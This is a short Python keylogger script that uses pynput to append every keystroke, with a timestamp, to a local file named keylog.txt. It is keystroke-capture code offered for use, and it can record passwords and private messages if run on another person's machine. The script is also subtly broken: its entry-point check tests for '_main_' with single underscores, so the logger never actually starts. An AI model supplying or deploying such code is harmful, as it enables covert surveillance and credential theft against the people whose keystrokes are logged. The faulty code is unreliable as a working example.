# pip install pynput
from pynput import keyboard
import os
from datetime import datetime

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.now()} - {key}\n")

def start_logger():
    print(f"[INFO] Keylogger started. Logging to {os.path.abspath(LOG_FILE)}")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "_main_":
    start_logger()
